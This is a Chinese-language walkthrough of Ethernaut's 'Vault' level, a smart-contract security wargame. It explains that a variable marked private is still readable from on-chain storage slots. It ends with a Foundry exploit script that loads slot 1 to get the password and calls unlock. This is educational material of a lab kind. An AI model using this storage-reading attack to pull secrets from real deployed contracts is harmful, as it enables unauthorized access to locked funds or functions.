# Level 8 - Vault

## 題目
[Vault](https://ethernaut.openzeppelin.com/level/0xB7257D8Ba61BD1b3Fb7249DCd9330a023a5F3670)

### 通關條件
打開金庫(Vault)來通過這一關ㄅ！
### 合約內容
```solidity=
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```
## 解題
這題是打開金庫，就是把 `locked` 變成 `false` 就可以了
只要在合約 13 行的 `unlock(bytes32 _password)`輸入正確的密碼，就可以改變`locked`的值。所以只要取得 `password` 的值就可以解開這題。
智能合約的特色就是所有的資料和操作都會上鏈。雖然 `password` 被宣告為 `private`，但依然會被存在鏈上。所以我們要算出他被儲存在合約的哪裡。

在 Solidity 中，合約的**狀態變數**都會被存在 storage slot 中，storage slot 會被實際寫入到區塊鏈上，每個合約可以有 $2^{256}$ 個 slot，每個 slot 可以存放 256 bit（32 bytes）。今天如果兩個變數宣告的長度都沒有超過 32 bytes 會被放入同一個 slot 中。

>[!Tip]
> Solidity 變數分為三種：
> 1. 狀態變數 state variable：儲存在鏈上，在 function 外、合約內宣告
> 2. 局部變數 local variable：宣告在 function 內，function 跑完就被釋放
> 3. 全域變數 global variable：預留關鍵字，不用宣告可以直接使用

關於 storage slot 可以看以下幾篇有更詳細的解釋：
- [WTF Solidity极简入门: 5. 变量数据存储和作用域 storage/memory/calldata](https://github.com/AmazingAng/WTF-Solidity/tree/main/05_DataStorage)
- [Understanding Solidity’s Storage Layout And How To Access State Variables](https://medium.com/@flores.eugenio03/exploring-the-storage-layout-in-solidity-and-how-to-access-state-variables-bf2cbc6f8018)

這題合約中的變數有兩個，分別是`bool locked` 和 `bytes32 password`。按照儲存規則，slot 會長這樣：

| slot idx | (type)Variable | 
| ------| --------        |
| 0     | (bool) locked    |
| 1     | (bytes32) password|

所以我們要讀取 slot 1 取得 `password`，再呼叫 `unlock(bytes32 _password)` ，關於讀取的方法我是用 [Foundry 的 vm.load](https://book.getfoundry.sh/cheatcodes/load) 完成，攻擊合約如下：
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/08_Vault.sol";

contract ExploitScript is Script {
    Vault public level08 = Vault(your_challenge_address);

    function run() external {
        vm.startBroadcast();

        bytes32 password = vm.load(address(level08), bytes32(uint256(1)));
        level08.unlock(password);

        vm.stopBroadcast();
    }
}
```
###